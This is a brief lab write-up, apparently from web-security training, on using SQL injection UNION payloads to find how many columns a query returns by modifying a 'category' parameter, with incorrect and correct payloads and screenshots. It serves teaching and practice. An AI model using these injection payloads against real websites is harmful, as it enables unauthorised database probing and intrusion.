# Lab 01

## Lab: SQL injection UNION attack, determining the number of columns returned by the query

**Objective:** Try to find a right column

**Payload:** '+UNION+SELECT+NULL--

**Step-by-step:**
1. Intercept filter & Modify the "category" parameter
2. Find how many column (NULL,NULL,NULL)

INCORRECT
Payload: '+UNION+SELECT+NULL--

![04a7c380633f45409092914e180392ed](https://user-images.githubusercontent.com/44063862/106163947-73402500-61c4-11eb-95ee-c305298a6827.png)

CORRECT
Payload: '+UNION+SELECT+NULL,NULL,NULL--

![051015034b5a48479da3a365c5042aa5](https://user-images.githubusercontent.com/44063862/106163478-2b210280-61c4-11eb-89b3-fd47f8532ed2.png)
